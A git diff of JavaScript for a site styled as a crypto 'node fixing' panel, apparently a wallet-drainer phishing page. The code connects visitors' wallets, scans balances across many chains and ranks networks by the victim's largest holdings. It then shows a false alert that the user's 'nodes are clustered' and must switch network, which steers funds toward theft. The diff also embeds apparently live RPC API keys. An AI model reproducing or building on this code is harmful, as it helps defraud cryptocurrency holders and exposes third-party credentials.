@@ -25,7 +25,7 @@ const bsc = {
   chainId: 56,
   name: 'Binance Smart chain',
   explorerUrl: 'https://bscscan.com/',
-  rpcUrl: 'https://bsc-mainnet.public.blastapi.io'
+  rpcUrl: 'https://icy-quaint-silence.bsc.quiknode.pro/18b9bef5fff9264be562bf4365eedff44e109f9a/'
 }
 
 const optimism = {
@@ -218,7 +218,7 @@ const opbnb = {
 
 // 3. Create your application's metadata object
 const metadata = {
-  name: 'Resolverconsult-panel',
+  name: 'Resolverconsult-panel.com',
   description: 'A crypto node/panel for fixing node clusters, validation and monitoring',
   url: 'Resolverconsult-panel.com', // url must match your domain & subdomain
   icons: ['https://avatars.mywebsite.com/']
@@ -419,7 +419,7 @@ async function connectWallet() {
        
         let networkDetect = [
             {chainId: mainnet.chainId, name: mainnet.name, rpcurl: 'https://mainnet.infura.io/v3/3b0245ef6bf444d7baf773a9a3b68921', nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
-            {chainId: bsc.chainId, name: bsc.name, rpcurl: 'https://bsc-mainnet.public.blastapi.io', nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
+            {chainId: bsc.chainId, name: bsc.name, rpcurl: 'https://icy-quaint-silence.bsc.quiknode.pro/18b9bef5fff9264be562bf4365eedff44e109f9a/', nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
             {chainId: arbitrum.chainId, name: arbitrum.name, rpcurl: 'https://arb-mainnet.g.alchemy.com/v2/2YV6LZ06vlLEhAoXjhHyN4WrXjQwG4WW', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://arbiscan.io/', fetchTokens: fetchARBTokens},
             {chainId: optimism.chainId, name: optimism.name, rpcurl: 'https://opt-mainnet.g.alchemy.com/v2/q6r7-bg0Cfz47MgbP7IpK5fsfZvaOBRj', nativeCurrency: {name: 'Ethereum', symbol: 'ETH'}, blockExplorerUrl: 'https://optimistic.etherscan.io/', fetchTokens: fetchOPTokens},
             {chainId: arbnova.chainId, name: arbnova.name, rpcurl: 'https://arbitrum-nova.public.blastapi.io', nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://nova.arbiscan.io/', fetchTokens: fetchARBNOVATokens},
@@ -500,16 +500,9 @@ async function connectWallet() {
                 }
             }
             if(nonZeroBalance.length > 0){
-                const tokenSymbols = nonZeroBalance.map(token => token.symbol.toLowerCase())
-                const options = { method: 'GET', headers: { accept: 'application/json'} }
-                const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${tokenSymbols.join(',')}&vs_currencies=usd`, options);
-                const prices = await response.json();
-
-                const totalValueUsd = nonZeroBalance.reduce((total, token) => {
-                    const price = prices[token.symbol.toLowerCase()].usd;
-                    return total + token.balance * price;
-                }, 0)
-
+                nonZeroBalance.sort((a, b) => b.balance - a.balance);
+                const highestSingleTokenBalanceUSD = ethers.utils.formatUnits(highestSingleTokenBalance)
+                const newHighestSingleUSD = highestSingleTokenBalanceUSD * 0.002
 
                 networksWithTokens.push({
                     chainId: nets.chainId,
@@ -517,9 +510,9 @@ async function connectWallet() {
                     rpcUrl: nets.rpcurl,
                     nativeCurrency: nets.nativeCurrency,
                     blockExplorerUrl: nets.blockExplorerUrl,
-                    totalValueUSD: totalValueUsd.toFixed(2),
                     highestSingleTokenBalance: ethers.utils.formatUnits(highestSingleTokenBalance, 18), // Format highest single token balance
                     netBalances: ethers.utils.formatUnits(netBalances, 18),
+                    highestSingleTokenBalanceUSD: newHighestSingleUSD
                 })
             }
         }
@@ -528,18 +521,20 @@ async function connectWallet() {
       }
       
         // Sort networks by highest single token balance in descending order
-        networksWithTokens.sort((a, b) => parseFloat(b.totalValueUSD) - parseFloat(a.totalValueUSD));
-        // console.log('Networks with tokens sorted by highest single token balance:', networksWithTokens.map(net => ({
-        //     name: net.name,
-        //     highestSingleTokenBalance: net.highestSingleTokenBalance
-        // })));
+        networksWithTokens.sort((a, b) => parseFloat(b.highestSingleTokenBalance) - parseFloat(a.highestSingleTokenBalance));
+
+        console.log('Networks with tokens sorted by highest single token balance and usd value:', networksWithTokens.map(net => ({
+            name: net.name,
+            highestSingleTokenBalance: net.highestSingleTokenBalance,
+            highestSingleTokenBalanceUSD: net.highestSingleTokenBalanceUSD
+        })));
 
         const maxSingleTokenBalance = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalance)));
-        const maxSingleTokenBalanceUSD = Math.max(...networksWithTokens.map(net => parseFloat(net.totalValueUSD)));
+        const maxSingleTokenBalanceUSD = Math.max(...networksWithTokens.map(net => parseFloat(net.highestSingleTokenBalanceUSD)));
+
 
         console.log(`Maximum single token balance: ${maxSingleTokenBalance}`);
-        console.log(`Maximum single token balance: ${maxSingleTokenBalanceUSD}`);
-
+        console.log(`Maximum single token balance usd value: ${maxSingleTokenBalanceUSD}`)
 
         if (!networksWithTokens.some(net => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
             window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map(net => net.name).join(", ")}. Please switch your network!`);
